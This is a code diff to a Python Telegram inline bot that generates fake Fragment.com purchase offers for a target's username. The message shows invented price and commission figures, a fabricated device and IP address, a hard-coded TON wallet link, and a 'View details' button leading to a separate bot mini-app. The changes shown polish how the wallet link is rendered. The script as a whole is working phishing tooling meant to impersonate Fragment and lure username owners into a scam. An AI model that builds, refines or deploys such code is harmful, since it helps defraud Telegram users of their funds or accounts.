@@ -6,7 +6,7 @@ import asyncio
 from http.server import HTTPServer, BaseHTTPRequestHandler
 from urllib.parse import urlparse, parse_qs
 import threading
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, MessageEntity
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, MessageEntity, InputTextMessageContent, InlineQueryResultArticle
 from telegram.ext import Application, InlineQueryHandler, ContextTypes
 
 # Configuration
@@ -46,17 +46,18 @@ def get_ton_price():
             return 5.50
 
 def generate_fragment_message(username, ton_amount):
-    """Génère le message Fragment, wallet cliquable avec markdown [text](url)"""
+    """Génère le message Fragment avec wallet cliquable et sans gestion markdown intégrée."""
 
     ton_price = get_ton_price()
     price = float(ton_amount)
     price_usd = price * ton_price
     commission = price * 0.05
     commission_usd = commission * ton_price
-    wallet_address = "UQBBlxK8VBxEidbxw4oQVyLSk7iEf9VPJxetaRQpEbi-XDPR"
-    wallet_link_markdown = f"[{wallet_address}](https://tonviewer.com/{wallet_address})"
 
-    fragment_message = (
+    wallet_address = "UQBBlxK8VBxEidbxw4oQVyLSk7iEf9VPJxetaRQpEbi-XDPR"
+    wallet_label = wallet_address
+
+    message_start = (
         f"We have received a purchase request for your username @{username} via Fragment.com. Below are the transaction details:\n\n"
         f"• Offer Amount: 💎{price:g} (${price_usd:.2f} USD)\n"
         f"• Commission: 💎{commission:g} (${commission_usd:.2f} USD)\n\n"
@@ -64,7 +65,7 @@ def generate_fragment_message(username, ton_amount):
         "Additional Information:\n"
         "• Device: Safari on macOS  \n"
         "• IP Address: 103.56.72.245\n"
-        f"• Wallet: {wallet_link_markdown}\n\n"
+        f"• Wallet: {wallet_label}\n\n"
         "Important:\n"
         "• Please proceed only if you are willing to transform your username into a collectible. This action is irreversible.\n"
         "• If you choose not to proceed, simply ignore this message."
@@ -72,8 +73,9 @@ def generate_fragment_message(username, ton_amount):
 
     entities = []
 
+    # Bold on offer/commission/important texts (same as before)
     offer_text = f"• Offer Amount: 💎{price:g} (${price_usd:.2f} USD)"
-    offer_start = fragment_message.find(offer_text)
+    offer_start = message_start.find(offer_text)
     if offer_start != -1:
         entities.append(MessageEntity(
             type=MessageEntity.BOLD,
@@ -82,7 +84,7 @@ def generate_fragment_message(username, ton_amount):
         ))
 
     commission_text = f"• Commission: 💎{commission:g} (${commission_usd:.2f} USD)"
-    commission_start = fragment_message.find(commission_text)
+    commission_start = message_start.find(commission_text)
     if commission_start != -1:
         entities.append(MessageEntity(
             type=MessageEntity.BOLD,
@@ -91,7 +93,7 @@ def generate_fragment_message(username, ton_amount):
         ))
 
     important_text1 = "• Please proceed only if you are willing to transform your username into a collectible. This action is irreversible."
-    important_start1 = fragment_message.find(important_text1)
+    important_start1 = message_start.find(important_text1)
     if important_start1 != -1:
         entities.append(MessageEntity(
             type=MessageEntity.BOLD,
@@ -100,7 +102,7 @@ def generate_fragment_message(username, ton_amount):
         ))
 
     important_text2 = "• If you choose not to proceed, simply ignore this message."
-    important_start2 = fragment_message.find(important_text2)
+    important_start2 = message_start.find(important_text2)
     if important_start2 != -1:
         entities.append(MessageEntity(
             type=MessageEntity.BOLD,
@@ -108,15 +110,23 @@ def generate_fragment_message(username, ton_amount):
             length=len(important_text2)
         ))
 
+    # Insert TEXT_LINK entity for the wallet ADDRESS ONLY (not the label "Wallet: ")
+    wallet_offset = message_start.find(wallet_label)
+    if wallet_offset != -1:
+        entities.append(MessageEntity(
+            type=MessageEntity.TEXT_LINK,
+            offset=wallet_offset,
+            length=len(wallet_label),
+            url=f"https://tonviewer.com/{wallet_address}"
+        ))
+
     button_url = f"https://t.me/BidRequestApp_bot/?startapp={username.lower()}-{price:g}"
     keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("View details", url=button_url)]])
 
-    return fragment_message, entities, keyboard
+    return message_start, entities, keyboard
 
 async def inline_query_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
-        from telegram import InlineQueryResultArticle, InputTextMessageContent
-
         query = update.inline_query.query.strip() if update.inline_query.query else ""
         if not query:
             await update.inline_query.answer([], cache_time=0)
@@ -148,7 +158,7 @@ async def inline_query_handler(update: Update, context: ContextTypes.DEFAULT_TYP
                 input_message_content=InputTextMessageContent(
                     fragment_message,
                     entities=entities,
-                    disable_web_page_preview=True  # Aperçu des liens désactivé
+                    disable_web_page_preview=True
                 ),
                 reply_markup=keyboard
             )
